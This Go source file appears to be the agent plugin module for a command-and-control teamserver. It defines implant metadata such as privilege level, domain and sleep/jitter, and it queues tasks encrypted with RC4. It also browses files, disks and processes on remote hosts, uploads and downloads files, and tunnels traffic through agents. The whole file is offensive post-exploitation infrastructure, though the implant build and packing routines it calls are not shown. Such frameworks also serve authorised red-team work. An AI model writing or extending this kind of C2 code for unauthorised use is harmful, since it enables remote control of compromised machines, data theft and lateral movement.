package main

import (
	"bytes"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"time"
)

type (
	PluginType  string
	TaskType    int
	MessageType int
)

const (
	AGENT PluginType = "agent"

	TASK    TaskType = 1
	BROWSER TaskType = 2
	JOB     TaskType = 3
	TUNNEL  TaskType = 4

	MESSAGE_INFO    MessageType = 5
	MESSAGE_ERROR   MessageType = 6
	MESSAGE_SUCCESS MessageType = 7

	DOWNLOAD_STATE_RUNNING  = 0x1
	DOWNLOAD_STATE_STOPPED  = 0x2
	DOWNLOAD_STATE_FINISHED = 0x3
	DOWNLOAD_STATE_CANCELED = 0x4
)

type Teamserver interface {
	//TsClientConnect(username string, socket *websocket.Conn)
	TsClientDisconnect(username string)

	TsListenerStart(listenerName string, configType string, config string, customData []byte) error
	TsListenerEdit(listenerName string, configType string, config string) error
	TsListenerStop(listenerName string, configType string) error
	TsListenerGetProfile(listenerName string, listenerType string) ([]byte, error)

	TsAgentGenetate(agentName string, config string, listenerProfile []byte) ([]byte, string, error)
	TsAgentRequest(agentType string, agentId string, beat []byte, bodyData []byte, listenerName string, ExternalIP string) ([]byte, error)
	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string)
	TsAgentUpdateData(newAgentObject []byte) error
	TsAgentCommand(agentName string, agentId string, username string, cmdline string, args map[string]any) error
	TsAgentCtxExit(agentId string, username string) error
	TsAgentRemove(agentId string) error
	TsAgentSetTag(agentId string, tag string) error

	TsTaskQueueAddQuite(agentId string, taskObject []byte)
	TsTaskUpdate(agentId string, cTaskObject []byte)
	TsTaskQueueGetAvailable(agentId string, availableSize int) ([][]byte, error)
	TsTaskStop(agentId string, taskId string) error
	TsTaskDelete(agentId string, taskId string) error

	TsDownloadAdd(agentId string, fileId string, fileName string, fileSize int) error
	TsDownloadUpdate(fileId string, state int, data []byte) error
	TsDownloadClose(fileId string, reason int) error
	TsDownloadSync(fileId string) (string, []byte, error)
	TsDownloadDelete(fileId string) error

	TsDownloadChangeState(fileId string, username string, command string) error
	TsAgentBrowserDisks(agentId string, username string) error
	TsAgentBrowserProcess(agentId string, username string) error
	TsAgentBrowserFiles(agentId string, path string, username string) error
	TsAgentBrowserUpload(agentId string, path string, content []byte, username string) error
	TsAgentBrowserDownload(agentId string, path string, username string) error

	TsClientBrowserDisks(jsonTask string, jsonDrives string)
	TsClientBrowserFiles(jsonTask string, path string, jsonFiles string)
	TsClientBrowserFilesStatus(jsonTask string)
	TsClientBrowserProcess(jsonTask string, jsonFiles string)

	TsTunnelConnectionClose(channelId int)
	TsTunnelConnectionResume(AgentId string, channelId int)
	TsTunnelConnectionData(channelId int, data []byte)
}

type ModuleExtender struct {
	ts Teamserver
}

type ModuleInfo struct {
	ModuleName string
	ModuleType PluginType
}

type AgentInfo struct {
	AgentName    string
	ListenerName string
	AgentUI      string
	AgentCmd     string
}

type AgentData struct {
	Crc        string `json:"a_crc"`
	Id         string `json:"a_id"`
	Name       string `json:"a_name"`
	SessionKey []byte `json:"a_session_key"`
	Listener   string `json:"a_listener"`
	Async      bool   `json:"a_async"`
	ExternalIP string `json:"a_external_ip"`
	InternalIP string `json:"a_internal_ip"`
	GmtOffset  int    `json:"a_gmt_offset"`
	Sleep      uint   `json:"a_sleep"`
	Jitter     uint   `json:"a_jitter"`
	Pid        string `json:"a_pid"`
	Tid        string `json:"a_tid"`
	Arch       string `json:"a_arch"`
	Elevated   bool   `json:"a_elevated"`
	Process    string `json:"a_process"`
	Os         int    `json:"a_os"`
	OsDesc     string `json:"a_os_desc"`
	Domain     string `json:"a_domain"`
	Computer   string `json:"a_computer"`
	Username   string `json:"a_username"`
	OemCP      int    `json:"a_oemcp"`
	ACP        int    `json:"a_acp"`
	CreateTime int64  `json:"a_create_time"`
	LastTick   int    `json:"a_last_tick"`
	Tags       string `json:"a_tags"`
}

type TaskData struct {
	Type        TaskType    `json:"t_type"`
	TaskId      string      `json:"t_task_id"`
	AgentId     string      `json:"t_agent_id"`
	StartDate   int64       `json:"t_start_date"`
	FinishDate  int64       `json:"t_finish_date"`
	Data        []byte      `json:"t_data"`
	CommandLine string      `json:"t_command_line"`
	MessageType MessageType `json:"t_message_type"`
	Message     string      `json:"t_message"`
	ClearText   string      `json:"t_clear_text"`
	Completed   bool        `json:"t_completed"`
	Sync        bool        `json:"t_sync"`
}

type ConsoleMessageData struct {
	Message string      `json:"m_message"`
	Status  MessageType `json:"m_status"`
	Text    string      `json:"m_text"`
}

type ListingFileData struct {
	IsDir    bool   `json:"b_is_dir"`
	Size     uint64 `json:"b_size"`
	Date     uint64 `json:"b_date"`
	Filename string `json:"b_filename"`
}

type ListingProcessData struct {
	Pid         uint   `json:"b_pid"`
	Ppid        uint   `json:"b_ppid"`
	SessionId   uint   `json:"b_session_id"`
	Arch        string `json:"b_arch"`
	Context     string `json:"b_context"`
	ProcessName string `json:"b_process_name"`
}

type ListingDrivesData struct {
	Name string `json:"b_name"`
	Type string `json:"b_type"`
}

var ModuleObject ModuleExtender
var PluginPath string
var MaxTaskDataSize int

func (m *ModuleExtender) InitPlugin(ts any) ([]byte, error) {
	var (
		buffer bytes.Buffer
		err    error
	)

	ModuleObject.ts = ts.(Teamserver)

	MaxTaskDataSize = SetMaxTaskDataSize
	info := ModuleInfo{
		ModuleName: SetName,
		ModuleType: AGENT,
	}

	err = json.NewEncoder(&buffer).Encode(info)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func (m *ModuleExtender) AgentInit(pluginPath string) ([]byte, error) {
	var (
		buffer bytes.Buffer
		err    error
	)

	PluginPath = pluginPath

	uiPath := filepath.Join(PluginPath, SetUiPath)
	agentUI, err := os.ReadFile(uiPath)
	if err != nil {
		return nil, err
	}
	cmdPath := filepath.Join(PluginPath, SetCmdPath)
	agentCmd, err := os.ReadFile(cmdPath)
	if err != nil {
		return nil, err
	}

	info := AgentInfo{
		AgentName:    SetName,
		ListenerName: SetListener,
		AgentUI:      string(agentUI),
		AgentCmd:     string(agentCmd),
	}

	err = json.NewEncoder(&buffer).Encode(info)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func (m *ModuleExtender) AgentGenerate(config string, listenerProfile []byte) ([]byte, string, error) {
	var (
		agentProfile []byte
		err          error
	)
	agentProfile, err = AgentGenerateProfile(config, listenerProfile)
	if err != nil {
		return nil, "", err
	}

	return AgentGenerateBuild(config, agentProfile)
}

func (m *ModuleExtender) AgentCreate(beat []byte) ([]byte, error) {
	var (
		buffer bytes.Buffer
		err    error
		agent  AgentData
	)

	agent, err = CreateAgent(beat)
	if err != nil {
		return nil, err
	}

	err = json.NewEncoder(&buffer).Encode(agent)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func (m *ModuleExtender) AgentCommand(agentObject []byte, args map[string]any) ([]byte, []byte, error) {
	var (
		taskData      TaskData
		agentData     AgentData
		messageData   ConsoleMessageData
		command       string
		err           error
		ok            bool
		bufferTask    bytes.Buffer
		bufferMessage bytes.Buffer
	)

	err = json.Unmarshal(agentObject, &agentData)
	if err != nil {
		goto ERR
	}

	command, ok = args["command"].(string)
	if !ok {
		err = errors.New("'command' must be set")
		goto ERR
	}

	taskData, messageData, err = CreateTask(m.ts, agentData, command, args)
	if err != nil {
		goto ERR
	}

	err = json.NewEncoder(&bufferTask).Encode(taskData)
	if err != nil {
		goto ERR
	}

	err = json.NewEncoder(&bufferMessage).Encode(messageData)
	if err != nil {
		goto ERR
	}

	return bufferTask.Bytes(), bufferMessage.Bytes(), nil

ERR:
	return nil, nil, err
}

func (m *ModuleExtender) AgentPackData(agentObject []byte, dataTasks [][]byte) ([]byte, error) {
	var (
		agentData  AgentData
		tasksArray []TaskData
		packedData []byte
		err        error
	)
	err = json.Unmarshal(agentObject, &agentData)
	if err != nil {
		return nil, err
	}

	dataTasks, err = m.ts.TsTaskQueueGetAvailable(agentData.Id, MaxTaskDataSize)
	if err != nil {
		return nil, err
	}

	for _, value := range dataTasks {
		var taskData TaskData
		err = json.Unmarshal(value, &taskData)
		if err != nil {
			return nil, err
		}
		tasksArray = append(tasksArray, taskData)
	}

	packedData, err = PackTasks(agentData, tasksArray)
	if err != nil {
		return nil, err
	}

	return RC4Crypt(packedData, agentData.SessionKey)
}

func (m *ModuleExtender) AgentProcessData(agentObject []byte, packedData []byte) ([]byte, error) {
	var (
		agentData   AgentData
		taskData    TaskData
		decryptData []byte
		err         error
	)
	err = json.Unmarshal(agentObject, &agentData)
	if err != nil {
		return nil, err
	}

	decryptData, err = RC4Crypt(packedData, agentData.SessionKey)
	if err != nil {
		return nil, err
	}

	taskData = TaskData{
		Type:        TASK,
		AgentId:     agentData.Id,
		FinishDate:  time.Now().Unix(),
		MessageType: MESSAGE_SUCCESS,
		Completed:   true,
		Sync:        true,
	}

	ProcessTasksResult(m.ts, agentData, taskData, decryptData)

	return nil, nil
}

/// BROWSERS

func (m *ModuleExtender) AgentDownloadChangeState(agentObject []byte, newState int, fileId string) ([]byte, error) {
	var (
		packData  []byte
		agentData AgentData
		taskData  TaskData
		buffer    bytes.Buffer
		err       error
	)
	err = json.Unmarshal(agentObject, &agentData)
	if err != nil {
		return nil, err
	}

	packData, err = BrowserDownloadChangeState(fileId, newState)
	if err != nil {
		return nil, err
	}

	taskData = TaskData{
		Type: BROWSER,
		Data: packData,
		Sync: false,
	}

	err = json.NewEncoder(&buffer).Encode(taskData)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func (m *ModuleExtender) AgentBrowserDisks(agentObject []byte) ([]byte, error) {
	var (
		packData  []byte
		agentData AgentData
		taskData  TaskData
		buffer    bytes.Buffer
		err       error
	)
	err = json.Unmarshal(agentObject, &agentData)
	if err != nil {
		return nil, err
	}

	packData, err = BrowserDisks(agentData)
	if err != nil {
		return nil, err
	}

	taskData = TaskData{
		Type: BROWSER,
		Data: packData,
		Sync: false,
	}

	err = json.NewEncoder(&buffer).Encode(taskData)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func (m *ModuleExtender) AgentBrowserProcess(agentObject []byte) ([]byte, error) {
	var (
		packData  []byte
		agentData AgentData
		taskData  TaskData
		buffer    bytes.Buffer
		err       error
	)
	err = json.Unmarshal(agentObject, &agentData)
	if err != nil {
		return nil, err
	}

	packData, err = BrowserProcess(agentData)
	if err != nil {
		return nil, err
	}

	taskData = TaskData{
		Type: BROWSER,
		Data: packData,
		Sync: false,
	}

	err = json.NewEncoder(&buffer).Encode(taskData)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func (m *ModuleExtender) AgentBrowserFiles(path string, agentObject []byte) ([]byte, error) {
	var (
		packData  []byte
		agentData AgentData
		taskData  TaskData
		buffer    bytes.Buffer
		err       error
	)
	err = json.Unmarshal(agentObject, &agentData)
	if err != nil {
		return nil, err
	}

	packData, err = BrowserFiles(path, agentData)
	if err != nil {
		return nil, err
	}

	taskData = TaskData{
		Type: BROWSER,
		Data: packData,
		Sync: false,
	}

	err = json.NewEncoder(&buffer).Encode(taskData)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func (m *ModuleExtender) AgentBrowserUpload(path string, content []byte, agentObject []byte) ([]byte, error) {
	var (
		packData  []byte
		agentData AgentData
		taskData  TaskData
		buffer    bytes.Buffer
		err       error
	)
	err = json.Unmarshal(agentObject, &agentData)
	if err != nil {
		return nil, err
	}

	packData, err = BrowserUpload(m.ts, path, content, agentData)
	if err != nil {
		return nil, err
	}

	taskData = TaskData{
		Type: BROWSER,
		Data: packData,
		Sync: false,
	}

	err = json.NewEncoder(&buffer).Encode(taskData)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func (m *ModuleExtender) AgentBrowserDownload(path string, agentObject []byte) ([]byte, error) {
	var (
		packData  []byte
		agentData AgentData
		taskData  TaskData
		buffer    bytes.Buffer
		err       error
	)
	err = json.Unmarshal(agentObject, &agentData)
	if err != nil {
		return nil, err
	}

	packData, err = BrowserDownload(path, agentData)
	if err != nil {
		return nil, err
	}

	taskData = TaskData{
		Type: TASK,
		Data: packData,
		Sync: true,
	}

	err = json.NewEncoder(&buffer).Encode(taskData)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func (m *ModuleExtender) AgentBrowserJobKill(jobId string) ([]byte, error) {
	var (
		packData []byte
		taskData TaskData
		buffer   bytes.Buffer
		err      error
	)

	packData, err = BrowserJobKill(jobId)
	if err != nil {
		return nil, err
	}

	taskData = TaskData{
		Type: TASK,
		Data: packData,
		Sync: false,
	}

	err = json.NewEncoder(&buffer).Encode(taskData)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

func (m *ModuleExtender) AgentBrowserExit(agentObject []byte) ([]byte, error) {
	var (
		packData  []byte
		agentData AgentData
		taskData  TaskData
		buffer    bytes.Buffer
		err       error
	)
	err = json.Unmarshal(agentObject, &agentData)
	if err != nil {
		return nil, err
	}

	packData, err = BrowserExit(agentData)
	if err != nil {
		return nil, err
	}

	taskData = TaskData{
		Type: TASK,
		Data: packData,
	}

	err = json.NewEncoder(&buffer).Encode(taskData)
	if err != nil {
		return nil, err
	}

	return buffer.Bytes(), nil
}

/// SYNC

func SyncBrowserDisks(ts Teamserver, task TaskData, drivesSlice []ListingDrivesData) {
	var (
		jsonDrives string
		jsonTask   string
		jsonData   []byte
		err        error
	)

	jsonData, err = json.Marshal(drivesSlice)
	if err != nil {
		return
	}
	jsonDrives = string(jsonData)

	jsonData, err = json.Marshal(task)
	if err != nil {
		return
	}
	jsonTask = string(jsonData)

	ts.TsClientBrowserDisks(jsonTask, jsonDrives)
}

func SyncBrowserFiles(ts Teamserver, task TaskData, path string, filesSlice []ListingFileData) {
	var (
		jsonDrives string
		jsonTask   string
		jsonData   []byte
		err        error
	)

	jsonData, err = json.Marshal(filesSlice)
	if err != nil {
		return
	}
	jsonDrives = string(jsonData)

	jsonData, err = json.Marshal(task)
	if err != nil {
		return
	}
	jsonTask = string(jsonData)

	ts.TsClientBrowserFiles(jsonTask, path, jsonDrives)
}

func SyncBrowserFilesStatus(ts Teamserver, task TaskData) {
	var (
		jsonTask string
		jsonData []byte
		err      error
	)

	jsonData, err = json.Marshal(task)
	if err != nil {
		return
	}
	jsonTask = string(jsonData)

	ts.TsClientBrowserFilesStatus(jsonTask)
}

func SyncBrowserProcess(ts Teamserver, task TaskData, processlist []ListingProcessData) {
	var (
		jsonProcess string
		jsonTask    string
		jsonData    []byte
		err         error
	)

	jsonData, err = json.Marshal(processlist)
	if err != nil {
		return
	}
	jsonProcess = string(jsonData)

	jsonData, err = json.Marshal(task)
	if err != nil {
		return
	}
	jsonTask = string(jsonData)

	ts.TsClientBrowserProcess(jsonTask, jsonProcess)
}

/// TUNNEL

func TunnelMessageConnect(channelId int, address string, port int) []byte {
	var (
		packData []byte
		taskData TaskData
		buffer   bytes.Buffer
	)

	packData, _ = TunnelCreate(channelId, address, port)

	taskData = TaskData{
		Type: TUNNEL,
		Data: packData,
		Sync: false,
	}

	json.NewEncoder(&buffer).Encode(taskData)
	return buffer.Bytes()
}

func TunnelMessageWrite(channelId int, data []byte) []byte {
	var (
		packData []byte
		taskData TaskData
		buffer   bytes.Buffer
	)

	packData, _ = TunnelWrite(channelId, data)

	taskData = TaskData{
		Type: TUNNEL,
		Data: packData,
		Sync: false,
	}

	json.NewEncoder(&buffer).Encode(taskData)
	return buffer.Bytes()
}

func TunnelMessageClose(channelId int) []byte {
	var (
		packData []byte
		taskData TaskData
		buffer   bytes.Buffer
	)

	packData, _ = TunnelClose(channelId)

	taskData = TaskData{
		Type: TUNNEL,
		Data: packData,
		Sync: false,
	}

	json.NewEncoder(&buffer).Encode(taskData)
	return buffer.Bytes()
}
